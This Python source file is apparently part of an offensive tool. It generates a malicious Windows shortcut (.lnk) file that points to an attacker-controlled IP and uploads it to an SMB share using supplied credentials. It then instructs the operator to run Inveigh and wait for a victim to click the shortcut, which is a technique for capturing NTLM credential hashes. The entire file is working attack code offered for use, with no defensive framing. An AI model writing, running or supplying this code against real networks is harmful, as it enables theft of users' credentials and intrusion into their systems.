from smb.SMBConnection import SMBConnection
import os
from generate_lnk import create_lnk_file
from colorama import init, Fore, Style



def upload_lnk_file_to_smb(server_ip, username, password, domain, share_name, attacker_ip, file_name=None):
    init(autoreset=True)
    lnk_file_path = create_lnk_file(attacker_ip, file_name)
    
    if lnk_file_path is None:
        print(f"{Fore.RED}[-] Failed to create the .lnk file.{Style.RESET_ALL}")
        return

    ports = [139, 445]
    connected = False

    for port in ports:
        try:
            print(f"{Fore.YELLOW}[!] Attempting to connect to SMB server on port {port}...{Style.RESET_ALL}")
            
            conn = SMBConnection(username, password, "client_machine", "server_name", domain=domain, use_ntlm_v2=True)
            conn.connect(server_ip, port)

            with open(lnk_file_path, 'rb') as file_obj:
                file_size = os.path.getsize(lnk_file_path)
                
                remote_filename = os.path.basename(lnk_file_path)
                
                conn.storeFile(share_name, remote_filename, file_obj, file_size=file_size)
            
            print(f"{Fore.GREEN}[+] File uploaded successfully: {remote_filename}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Run Inveigh.ps1 or Inveigh.exe and wait for the victim to click the lnk file {Style.RESET_ALL}")
            connected = True
            break

        except Exception as e:
            print(f"{Fore.RED}[-] Error on port {port}: {e}{Style.RESET_ALL}")

        finally:
            conn.close()
    
    if not connected:
        print(f"{Fore.RED}[-] Failed to connect and upload the file to both ports.{Style.RESET_ALL}")

